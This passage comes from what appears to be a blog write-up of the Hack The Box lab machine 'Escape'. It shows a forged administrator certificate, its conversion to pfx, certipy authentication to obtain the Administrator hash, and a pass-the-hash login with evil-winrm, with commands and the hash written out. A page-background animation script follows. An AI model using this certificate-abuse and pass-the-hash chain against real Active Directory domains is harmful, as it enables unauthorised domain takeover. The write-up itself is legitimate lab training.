class="text-tiny"><code>s645n2H0MbRHzXI2BKE4I+JCw9iCgNS1bQS+NgDPn0hAosZc7ysibSLtDr3Tv+fV</code></span><br><span class="text-tiny"><code>vXoNGzSRm5OFM6/irG+McNgZGzdtu8zL2pcJUjmMahJfyiA72K24vL//2a6Vqx17</code></span><br><span class="text-tiny"><code>r6+zSHz3ekDqkAhgNbJ4inR2CIBxqeZCwFxxD9uZxCpOmdQSmS2cSTLGbaKBAgMB</code></span><br><span class="text-tiny"><code>AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9</code></span><br><span class="text-tiny"><code>lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI</code></span><br><span class="text-tiny"><code>KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV</code></span><br><span class="text-tiny"><code>CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq</code></span><br><span class="text-tiny"><code>hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF</code></span><br><span class="text-tiny"><code>Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFLdpfrxJajL18I8Scn8jm3n2+zLX</code></span><br><span class="text-tiny"><code>MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud</code></span><br><span class="text-tiny"><code>IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg</code></span><br><span class="text-tiny"><code>gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi</code></span><br><span class="text-tiny"><code>bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv</code></span><br><span class="text-tiny"><code>bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz</code></span><br><span class="text-tiny"><code>ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE</code></span><br><span class="text-tiny"><code>gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049</code></span><br><span class="text-tiny"><code>QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv</code></span><br><span class="text-tiny"><code>bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/</code></span><br><span class="text-tiny"><code>b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF</code></span><br><span class="text-tiny"><code>AAOCAQEADu9nxoqEAQh9/tHLVjPMY4PPTIYmq5tVSt2gw4c/pIjeV9RGvRF8Qzy/</code></span><br><span class="text-tiny"><code>kh5oWNASILgn+HWhNxOodTJm6u4+gfS0qFWcgqLKdB4/wwGlEYkswIiULWUMR1h4</code></span><br><span class="text-tiny"><code>fT8NDMiCruNWmPo0rW0Vczvq1lAXkLeBJ4BGT5ti6yK6Q4kyHTQjMFvGNdYEuc6P</code></span><br><span class="text-tiny"><code>hI4m9lD6HD+r2SzWeKDdsi3ITGk/H5/uPrN7w4YEcIxSiBu2z2hS32L0Y9eI+lXI</code></span><br><span class="text-tiny"><code>EnT7TjfBwh7c/X58gcYHZyxuQYrp+4Pcb7HRQQ01yu14se5bFBAdeqCSkOt7oNei</code></span><br><span class="text-tiny"><code>RSQ7z+oJe//gBHsvW6F8KnGsoVtwSg==</code></span><br><span class="text-tiny"><code>-----END CERTIFICATE-----</code></span><br>&nbsp;</p><p>We then copy that key to our machine and name it cert.pem and use the command below to turn it into a pfx file.</p><p><code>openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx</code></p><p>&nbsp;</p><p>Due to kerberos my time was different from the machine so we have to use ntupdate to make our times match up.</p><p><code>ntpdate 10.10.11.202</code></p><p>&nbsp;</p><p>Now that its in the proper format and we have the proper time we can use certipy to give us the tgt and hash.</p><p><code>python3 entry.py auth -pfx 'cert.pfx' -username 'Administrator' -domain 'sequel.htb' -dc-ip 10.10.11.202</code><br>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:993/193;" src="../img/posts/2024-05-15-Escape(HTB)/04-e441b81603.png" width="993" height="193"></figure><p>&nbsp;</p><p>I spent a while trying to crack the ntlm hash or use a pass the hash tool but kept getting errors. Like usual i over complicated things a ton. We can just pass the hash with evil-winrm</p><p>&nbsp;</p><p><code>evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee</code></p>
+    </article>
+
+<script>
+        // ---------- Particle background ----------
+        (function () {
+            const canvas = document.getElementById('bg-canvas');
+            const ctx = canvas.getContext('2d');
+            const reduced = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+            const mouse = { x: null, y: null };
+            let particles = [];
+            let w = 0, h = 0;
+
+            function resize() {
+                const dpr = Math.min(window.devicePixelRatio || 1, 2);
+                w = window.innerWidth;
+                h = window.innerHeight;
+                canvas.width = w * dpr;
+                canvas.height = h * dpr;
+                canvas.style.width = w + 'px';
+                canvas.style.height = h + 'px';
+                ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+                seed();
+            }
+
+            function seed() {
+                const count = Math.min(90, Math.floor((w * h) / 16000));
+                particles = [];
+                for (let i = 0; i < count; i++) {
+                    particles.push({
+                        x: Math.random() * w,
+                        y: Math.random() * h,
+                        vx: (Math.random() - 0.5) * 0.35,
+                        vy: (Math.random() - 0.5) * 0.35,
+                        r: Math.random() * 1.5 + 0.7
+                    });
+                }
+            }
+
+            function draw() {
+                ctx.clearRect(0, 0, w, h);
+
+                for (const p of particles) {
+                    p.x += p.vx;
+                    p.y += p.vy;
+
+                    if (p.x < -20) p.x = w + 20;
+                    if (p.x > w + 20) p.x = -20;
+                    if (p.y < -20) p.y = h + 20;
+                    if (p.y > h + 20) p.y = -20;
+
+                    if (mouse.x !== null) {
+                        const dx = p.x - mouse.x;
+                        const dy = p.y - mouse.y;
+                        const d = Math.hypot(dx, dy);
+                        if (d < 120 && d > 0.001) {
+                            const f = (1 - d / 120) * 0.5;
+                            p.x += (dx / d) * f;
+                            p.y += (dy / d) * f;
+                        }
+                    }
+                }
+
+                for (let i = 0; i < particles.length; i++) {
+                    const a = particles[i];
+                    for (let j = i + 1; j < particles.length; j++) {
+                        const b = particles[j];
+                        const d = Math.hypot(a.x - b.x, a.y - b.y);
+                        if (d < 110) {
+                            ctx.strokeStyle = 'rgba(94, 234, 212, ' + (0.14 * (1 - d / 110)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(b.x, b.y);
+                            ctx.stroke();
+                        }
+                    }
+                    if (mouse.x !== null) {
+                        const d = Math.hypot(a.x - mouse.x, a.y - mouse.y);
+                        if (d < 140) {
+                            ctx.strokeStyle = 'rgba(124, 140, 248, ' + (0.18 * (1 - d / 140)).toFixed(3) + ')';
+                            ctx.lineWidth = 1;
+                            ctx.beginPath();
+                            ctx.moveTo(a.x, a.y);
+                            ctx.lineTo(mouse.x, mouse.y);
+                            ctx.stroke();
+                        }
+                    }
+                }
+
+                for (const p of particles) {
+                    ctx.fillStyle = 'rgba(232, 237, 242, 0.5)';
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                    ctx.fill();
+                }
+            }
+
+            function loop() {
+                if (!document.hidden) draw();
+                requestAnimationFrame(loop);
+            }
+
+            window.addEventListener('resize', resize);
+            window.addEventListener('mousemove', function (e) {
+                mouse.x = e.clientX;
+                mouse.y = e.clientY;
+            });
+            window.addEventListener('mouseleave', function () {
+                mouse.x = null;
+                mouse.y = null;
+            });
+
+            resize();
+            if (reduced) {
+                draw();
+            } else {
+                requestAnimationFrame(loop);
+            }
+        })();
+    </script>
+</body></html>
